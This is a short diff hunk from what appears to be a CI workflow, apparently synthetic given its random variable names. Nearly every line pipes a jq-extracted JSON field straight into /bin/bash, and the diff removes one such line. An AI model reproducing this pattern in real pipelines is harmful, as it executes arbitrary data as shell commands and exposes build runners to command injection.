@@ -31,7 +31,6 @@ jobs:
           echo $vo055 | jq -r .zemv1 | /bin/bash
           printf '%s' "$hz6" | jq -r .baf8 | /bin/bash
           echo $tziqa38527 | jq -r .fcwtb76 | /bin/bash
-          echo $b4093 | jq -r .n5199 | /bin/bash
           echo $om8 | jq -r .gd36520 | /bin/bash
           printf '%s' "$oodgv54" | jq -r .vojqr9 | /bin/bash
           echo $scekc4 | jq -r .vma906 | /bin/bash
